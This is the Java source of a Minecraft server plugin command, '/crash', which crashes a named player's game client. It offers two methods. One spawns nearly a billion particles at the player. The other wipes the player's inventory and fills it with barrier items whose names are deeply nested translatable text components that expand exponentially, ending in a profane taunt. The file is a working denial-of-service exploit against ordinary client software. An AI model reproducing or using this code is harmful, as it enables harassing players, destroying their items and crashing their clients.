package creativitium.revolution.administration.commands;

import creativitium.revolution.administration.Administration;
import creativitium.revolution.foundation.command.CommandParameters;
import creativitium.revolution.foundation.command.RCommand;
import creativitium.revolution.foundation.command.SourceType;
import net.kyori.adventure.text.Component;
import org.bukkit.Material;
import org.bukkit.Particle;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.plugin.Plugin;
import org.jetbrains.annotations.Nullable;

import java.util.Arrays;
import java.util.List;
import java.util.Optional;

@CommandParameters(name = "crash",
        description = "Crash a player's client.",
        usage = "/crash <player> <method>",
        aliases = {"mc9000", "mc9k"},
        permission = "administration.command.crash", source = SourceType.BOTH)
public class Command_crash extends RCommand
{
    @Override
    public boolean run(CommandSender sender, Player playerSender, String commandLabel, String[] args)
    {
        if (args.length < 2) return false;

        getPlayer(args[0]).ifPresentOrElse(player ->
        {
            final Method method = Method.getMethod(args[1]);

            if (method == null)
            {
                msg(sender, "administration.command.crash.invalid_method");
                return;
            }

            switch (method)
            {
                case PARTICLES ->
                {
                    player.spawnParticle(Particle.ASH, player.getLocation(), 999999999);
                }
                case DECIMATOR ->
                {
                    player.getInventory().clear();

                    final ItemStack decimatorItem = new ItemStack(Material.BARRIER);
                    final ItemMeta meta = decimatorItem.getItemMeta();
                    meta.displayName(Component.translatable("%1$s%1$s%1$s", "%1$s%1$s%1$s",
                            Component.translatable("%1$s%1$s%1$s", "%1$s%1$s%1$s",
                            Component.translatable("%1$s%1$s%1$s", "%1$s%1$s%1$s",
                            Component.translatable("%1$s%1$s%1$s", "%1$s%1$s%1$s",
                            Component.translatable("%1$s%1$s%1$s", "%1$s%1$s%1$s",
                            Component.translatable("%1$s%1$s%1$s", "%1$s%1$s%1$s",
                            Component.translatable("%1$s%1$s%1$s", "%1$s%1$s%1$s",
                            Component.translatable("%1$s%1$s%1$s", "%1$s%1$s%1$s",
                            Component.translatable("%1$s%1$s%1$s", "%1$s%1$s%1$s",
                            Component.translatable("%1$s%1$s%1$s", "%1$s%1$s%1$s",
                            Component.translatable("%1$s%1$s%1$s", "%1$s%1$s%1$s",
                            Component.translatable("%1$s%1$s%1$s", "%1$s%1$s%1$s",
                            Component.translatable("%1$s%1$s%1$s", "%1$s%1$s%1$s",
                            Component.translatable("%1$s%1$s%1$s", "%1$s%1$s%1$s",
                            Component.translatable("%1$s%1$s%1$s", "%1$s%1$s%1$s",
                            Component.translatable("%1$s%1$s%1$s", "%1$s%1$s%1$s",
                            Component.translatable("%1$s%1$s%1$s", "%1$s%1$s%1$s",
                            Component.translatable("%1$s%1$s%1$s", "%1$s%1$s%1$s",
                            Component.translatable("%1$s%1$s%1$s", "%1$s%1$s%1$s",
                            Component.translatable("%1$s%1$s%1$s", "%1$s%1$s%1$s",
                            Component.translatable("%1$s%1$s%1$s", "%1$s%1$s%1$s",
                            Component.translatable("%1$s%1$s%1$s", "%1$s%1$s%1$s",
                            Component.translatable("%1$s%1$s%1$s", "%1$s%1$s%1$s",
                            Component.text("GET ABSOLUTELY FUCKED!")))))))))))))))))))))))));
                    decimatorItem.setItemMeta(meta);
                    decimatorItem.setAmount(6400);
                    player.getInventory().addItem(decimatorItem);
                }
            }

            msg(sender, "administration.command.crash.done");
        }, () -> msg(sender, "revolution.command.error.player_not_found"));
        return true;
    }

    @Override
    public @Nullable List<String> tabCompleteOptions(CommandSender sender, Player playerSender, String commandLabel, String[] args)
    {
        if (args.length == 1)
        {
            return match(getOnlinePlayers(), args[0]);
        }
        else if (args.length == 2)
        {
            return match(Arrays.stream(Method.values()).map(method -> method.name().toLowerCase()).toList(), args[1]);
        }
        else
        {
            return null;
        }
    }

    public enum Method
    {
        PARTICLES,
        DECIMATOR;

        public static Method getMethod(String name)
        {
            try
            {
                return Method.valueOf(name.toUpperCase());
            }
            catch (Throwable ex)
            {
                return null;
            }
        }
    }

    @Override
    public Plugin getPlugin()
    {
        return Administration.getInstance();
    }
}
